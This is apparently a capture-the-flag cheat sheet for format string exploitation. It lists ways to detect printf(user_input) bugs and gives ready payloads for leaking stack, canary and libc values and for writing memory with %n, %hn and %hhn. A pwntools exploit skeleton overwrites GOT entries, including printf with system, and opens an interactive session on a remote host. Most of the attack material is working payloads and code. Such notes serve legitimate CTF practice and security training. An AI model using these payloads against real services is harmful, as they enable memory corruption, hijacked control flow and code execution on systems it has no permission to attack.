# Pwn Format String

## When to suspect this

- Source has `printf(user_input)`, `fprintf(log, user)`, `syslog(user)`.
- Sending `%p %p %p` leaks pointers.
- Program echoes formatted values instead of literal `%p`.
- User-controlled field is used as logging/printf format string.

## Fast triage checklist

- Send `%p` sequence and identify stack offset.
- Find where your marker lands.
- Leak canary, PIE, libc, stack as needed.
- Check RELRO to choose write target.
- Test `%n` writes only on local or safe target.
- Use pwntools `FmtStr`/`fmtstr_payload` after offset is known.

## Manual confirmation

```bash
python3 - <<'PY'
print('AAAA ' + ' '.join(f'%{i}$p' for i in range(1,40)))
PY
```

Marker:

```text
AAAABBBB.%1$p.%2$p.%3$p...
```

Positive signal:

- Output contains stack pointers.
- `0x41414141`/`0x42424242` appears at a stable offset.
- `%s` can read known pointer, or `%n` can write locally.

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| [scripts/pwn/fmtstr_template.py](../scripts/pwn/fmtstr_template.py) | Known offset and target writes | `python3 scripts/pwn/fmtstr_template.py REMOTE` | Leak/write |
| pwntools `FmtStr` | Auto-detect offset in simple services | Use `FmtStr(exec_fmt)` | Offset found |
| checksec | RELRO/PIE/canary strategy | `checksec --file=chall` | Write targets |
| GDB | Verify stack positions | Break at printf | Format arg layout |

## Payload starter pack

Leak:

```text
%p.%p.%p.%p
%6$p
%7$sAAAA<addr>
```

Write:

```text
%123c%8$n
%4660c%8$hn
%65c%8$hhn
```

Pwntools:

```python
payload = fmtstr_payload(offset, {elf.got["printf"]: elf.sym["system"]})
```

## Exploit skeleton

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./chall")
HOST, PORT = "HOST", 1337
offset = 6

io = remote(HOST, PORT) if args.REMOTE else process(elf.path)
target = elf.got["printf"]
value = elf.sym["win"]
payload = fmtstr_payload(offset, {target: value}, write_size="short")
io.sendlineafter(b"> ", payload)
io.interactive()
```

## Escalation path

- Leak canary/PIE/libc first if needed.
- Partial RELRO: overwrite GOT.
- Full RELRO: overwrite return address, hooks if available, `.fini_array`, function pointers.
- If `%n` blocked, use leaks plus another overflow.
- If input transformed, pre-encode format string.

## Common bypasses

- Positional vs sequential specifiers.
- `%hn`/`%hhn` for smaller writes.
- Width padding calculations.
- Address placed after format string with known offset.
- ROT13/base64 transformed format strings.
- `__printf_chk` may block `%n` but still allow sequential leaks.

## Rabbit holes

- Guessing offset without marker.
- Writing full 8-byte values in one shot.
- Forgetting bytes already printed.
- Crashing remote with unsafe `%s` reads before proving address validity.

## Final solve checklist

- Format offset is known.
- Required leaks are parsed.
- Write target is valid under RELRO.
- Final payload is stable across process restarts.

